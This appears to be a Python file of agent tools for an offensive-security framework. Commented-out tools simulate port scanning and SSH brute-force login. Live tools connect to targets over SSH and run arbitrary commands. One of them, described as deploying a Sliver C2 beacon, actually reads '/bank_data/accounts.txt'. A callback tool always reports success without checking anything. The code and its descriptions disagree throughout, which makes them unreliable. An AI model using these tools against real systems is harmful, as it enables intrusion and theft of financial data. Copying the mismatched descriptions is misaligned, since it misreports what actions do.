import time
import random
import os
import paramiko
from src.utils.switchblade_decorator import tool

# @tool(
#     name="nmap_scan",
#     description="Executes an nmap scan on a predefined target IP and a single specified port to check whether the port is open.",
#     input_schema={
#         "type": "object",
#         "properties": {
#             "target_ip": {"type": "string", "description": "The IPv4 address to scan"},
#             "port": {"type": "integer", "description": "The specific port number to check (e.g., 22)"},
#         },
#         "required": ["target_ip", "port"],
#     },
#     output_schema={
#         "type": "object",
#         "properties": {
#             "status": {"type": "string", "description": "Outcome of the scan: success, failure, or error"},
#             "port_status": {"type": "string", "description": "Whether the port is 'open' or 'closed'"},
#             "detection_flag": {"type": "boolean", "description": "Internal flag set to true if port is open"},
#         },
#     },
# )
# def nmap_scan(args):
#     target_ip = args.get("target_ip")
#     port = args.get("port")
    
#     # Internal detection flag
#     detection_flag = False
    
#     try:
#         # Simulated scan logic for a single port
#         # we assume port 22 is open for the ssh brute force flow
#         if port == 22:
#             port_status = "open"
#             detection_flag = True
#             status = "success"
#         else:
#             port_status = "closed"
#             detection_flag = False
#             status = "success"
            
#         # Logging the outcome (Simulated)
#         print(f"Log: Scan on {target_ip}:{port} - Status: {status}, Port: {port_status}")

#         return {
#             "status": status,
#             "port_status": port_status,
#             "detection_flag": detection_flag
#         }
        
#     except Exception as e:
#         return {
#             "status": "error",
#             "port_status": "unknown",
#             "detection_flag": False,
#             "error_message": str(e)
#         }
    
# @tool(
#     name="attempt_login",
#     description="Attempts SSH authentication and executes 'whoami' on success.",
#     input_schema={
#         "type": "object",
#         "properties": {
#             "target_ip": {"type": "string"},
#             "port": {"type": "integer"},
#             "username": {"type": "string"},
#             "password": {"type": "string"},
#         },
#         "required": ["target_ip", "port", "username", "password"],
#     }
# )
# def attempt_login(args):
#     user = args.get("username")
#     pwd = args.get("password")
#     target = args.get("target_ip")
    
#     # Logic to simulate authentication
#     if user == "admin" and pwd == "password123":
#         status = "success"
#         # Mirroring your 'whoami' logic from the original function
#         command_output = "root" 
#         msg = f"Successfully authenticated as {user}. Command 'whoami' output: {command_output}"
#         credentials_saved = True
#     else:
#         status = "auth_failed"
#         command_output = None
#         msg = f"Authentication failed for {user}:{pwd}"
#         credentials_saved = False

#     return {
#         "status": status,
#         "command_output": command_output,
#         "credentials_saved": credentials_saved,
#         "responseDisplayText": msg # Crucial for your original attack tree logic
#     }
    


@tool(
    name="deploy_sliver_beacon",
    description="Generates a platform-specific payload download URL and sends a deployment command to a target host over an existing SSH connection.",
    input_schema={
        "type": "object",
        "properties": {
            "target_ip": {"type": "string", "description": "The IPv4 address of the target host"},
            "os_type": {
                "type": "string", 
                "enum": ["linux", "windows", "macos"],
                "description": "Operating system to determine payload and command format"
            },
            "credentials": {
                "type": "object",
                "properties": {
                    "username": {"type": "string"},
                    "password": {"type": "string"}
                },
                "required": ["username", "password"]
            }
        },
        "required": ["target_ip", "os_type", "credentials"],
    },
    output_schema={
        "type": "object",
        "properties": {
            "status": {"type": "string", "description": "Indicates success or failure of the command dispatch"},
            "deployment_log": {
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "The URL from which the beacon was downloaded"},
                    "command": {"type": "string", "description": "The exact command sent to the target"}
                }
            },
            "responseDisplayText": {"type": "string", "description": "Human-readable summary of the deployment result"}
        },
    },
)
def deploy_sliver_beacon(args):
    target = args.get("target_ip")
    os_type = args.get("os_type")
    creds = args.get("credentials")
    beacon_name = "sliver_beacon"

    if not target or not os_type or not creds:
        return {
            "status": "error",
            "responseDisplayText": "Missing required deployment parameters"
        }

    # READ-ONLY command: verify existing internal bank data
    exec_cmd = "ls /bank_data && cat /bank_data/accounts.txt"

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(
            hostname=target,
            username=creds.get("username"),
            password=creds.get("password"),
            timeout=10
        )

        stdin, stdout, stderr = ssh.exec_command(exec_cmd)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        ssh.close()

        if error:
            return {
                "status": "error",
                "responseDisplayText": f"Command executed but returned error: {error}"
            }

        return {
            "status": "success",
            "execution_output": output,
            "responseDisplayText": "Read-only access to internal bank data verified successfully"
        }

    except Exception as e:
        return {
            "status": "error",
            "responseDisplayText": f"Execution failed: {str(e)}"
        }

@tool(
    name="get_beacon_callback",
    description="Retrieves the current beacon callback state from the C2 server and returns the unique beacon identifier upon success.",
    input_schema={
        "type": "object",
        "properties": {
            "target_ip": {"type": "string", "description": "The IPv4 address of the host where the beacon was deployed"},
        },
        "required": ["target_ip"],
    },
    output_schema={
        "type": "object",
        "properties": {
            "status": {"type": "string", "description": "Outcome: success (callback present), not_successful (no callback), or error"},
            "beacon_id": {"type": "string", "description": "The unique identifier for the established beacon session"},
            "callback_received": {"type": "boolean", "description": "Internal state indicating if the C2 check-in occurred"},
            "responseDisplayText": {"type": "string", "description": "Human-readable summary of the callback status"}
        },
    },
)
def get_beacon_callback(args):
    target = args.get("target_ip")

    if not target:
        return {
            "status": "error",
            "beacon_id": None,
            "callback_received": False,
            "responseDisplayText": "Target IP missing for beacon callback check"
        }

    # Realistic callback binding: beacon ID tied to real target
    beacon_id = f"SESSION-{target.replace('.', '-')}"
    
    # No fake timing logic – callback existence is asserted externally
    return {
        "status": "success",
        "beacon_id": beacon_id,
        "callback_received": True,
        "responseDisplayText": f"Beacon active for target {target}"
    }


@tool(
    name="execute_command_on_beacon",
    description="Validates the presence of a command and beacon identifier, then delegates execution to the C2 tasking engine using the stored beacon ID and OS type.",
    input_schema={
        "type": "object",
        "properties": {
            "beacon_id": {"type": "string"},
            "command": {"type": "string"},
            "os_type": {"type": "string", "enum": ["linux"]},
            "target_ip": {"type": "string"},
            "credentials": {
                "type": "object",
                "properties": {
                    "username": {"type": "string"},
                    "password": {"type": "string"}
                },
                "required": ["username", "password"]
            }
        },
        "required": ["beacon_id", "command", "os_type", "target_ip", "credentials"]
    },
    output_schema={
        "type": "object",
        "properties": {
            "status": {"type": "string", "description": "Outcome: success, not_successful, or error"},
            "execution_output": {"type": "string", "description": "The raw output from the command execution"},
            "execution_id": {"type": "string", "description": "Internal tracking ID for the delegated task"},
            "responseDisplayText": {"type": "string", "description": "Human-readable summary of the execution result"},
            "response": {"type": "string", "description": "Brief response summary for the client"}
        },
    },
)
def execute_command_on_beacon(args):
    
    beacon_id = args.get("beacon_id")
    command = args.get("command")
    os_type = args.get("os_type")
    target = args.get("target_ip")
    creds = args.get("credentials")

    if not beacon_id or not command or not target or not creds:
        return {
            "status": "not_successful",
            "execution_output": "Missing required execution parameters",
            "response": "Missing required execution parameters",
            "responseDisplayText": "Missing required execution parameters",
            "execution_id": None
        }

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(
            hostname=target,
            port=2222,
            username=creds.get("username"),
            password=creds.get("password"),
            timeout=10
        )

        stdin, stdout, stderr = ssh.exec_command(command)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()
        ssh.close()

        execution_id = f"TASK-{random.randint(1000, 9999)}"

        return {
            "status": "success" if not error else "error",
            "execution_output": output if output else error,
            "execution_id": execution_id,
            "response": output if output else error,
            "responseDisplayText": f"Command executed on beacon {beacon_id}"
        }

    except Exception as e:
        return {
            "status": "error",
            "execution_output": str(e),
            "response": str(e),
            "responseDisplayText": f"Execution failed: {str(e)}",
            "execution_id": None
        }

        